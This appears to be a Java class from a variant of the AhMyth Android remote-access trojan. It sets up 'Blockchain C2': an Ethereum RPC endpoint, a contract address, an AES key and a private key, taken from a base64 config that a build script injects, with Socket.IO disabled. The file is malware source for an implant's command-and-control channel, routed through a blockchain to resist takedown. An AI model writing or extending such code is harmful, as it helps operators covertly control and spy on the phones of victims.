package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import org.json.JSONObject;
import io.socket.client.Socket; 

/**
 * Blockchain-ONLY Connection implementation.
 * This replaces the standard IOSocket class for blockchain-only builds.
 * It strictly enforces blockchain mode and does NOT initialize any Socket.IO connection.
 */
public class IOSocket {
    private static IOSocket ourInstance = null;
    
    // Blockchain C2 configuration
    private static boolean isBlockchainMode = true; // Always true for this variant
    private static String blockchainRpcUrl = "https://ethereum-sepolia-rpc.publicnode.com"; // Default
    private static String blockchainContractAddress = "0x0000000000000000000000000000000000000000"; // Placeholder
    private static String blockchainAesKey = ""; // Placeholder
    private static String blockchainClientPrivateKey = null;

    private IOSocket() {
        Log.d("IOSocket", "=== BLOCKCHAIN ONLY MODE INITIALIZING ===");
        
        try {
            // This placeholder will be replaced by the build script
            String configString = "BLOCKCHAIN_C2_CONFIG_PLACEHOLDER";
            
            // If the build script replaced the placeholder with config
            if (configString.startsWith("BLOCKCHAIN_C2_CONFIG:")) {
                try {
                    String base64Part = configString.substring("BLOCKCHAIN_C2_CONFIG:".length());
                    byte[] decodedBytes = android.util.Base64.decode(base64Part, android.util.Base64.DEFAULT);
                    String jsonStr = new String(decodedBytes, "UTF-8");
                    JSONObject config = new JSONObject(jsonStr);
                    
                    if ("blockchain".equals(config.optString("type"))) {
                         blockchainRpcUrl = config.optString("rpcUrl", blockchainRpcUrl);
                         blockchainContractAddress = config.optString("contractAddress", blockchainContractAddress);
                         blockchainAesKey = config.optString("aesKey", blockchainAesKey);
                         blockchainClientPrivateKey = config.optString("clientPrivateKey", null);
                         
                         Log.d("IOSocket", "Config loaded from injection:");
                         Log.d("IOSocket", "  RPC: " + blockchainRpcUrl);
                         Log.d("IOSocket", "  Contract: " + blockchainContractAddress);
                    }
                } catch (Exception e) {
                    Log.e("IOSocket", "Failed to parse injected config", e);
                }
            } else {
                 Log.w("IOSocket", "No blockchain config injected! Using defaults.");
            }
            
        } catch (Exception e) {
            Log.e("IOSocket", "Error during init", e);
        }
        
        Log.d("IOSocket", "Blockchain mode active. Socket.IO is DISABLED.");
    }

    public static IOSocket getInstance() {
        if (ourInstance == null) {
            ourInstance = new IOSocket();
        }
        return ourInstance;
    }

    // Returns NULL to indicate no socket connection (blockchain mode)
    public Socket getIoSocket() {
        return null; 
    }
    
    public static boolean isBlockchainMode() {
        return true;
    }
    
    public static boolean ensureBlockchainModeFromConfig() {
        return true;
    }
    
    public static String getBlockchainRpcUrl() {
        return blockchainRpcUrl;
    }
    
    public static String getBlockchainContractAddress() {
        return blockchainContractAddress;
    }
    
    public static String getBlockchainAesKey() {
        return blockchainAesKey;
    }
    
    public static String getBlockchainClientPrivateKey() {
        return blockchainClientPrivateKey;
    }
}












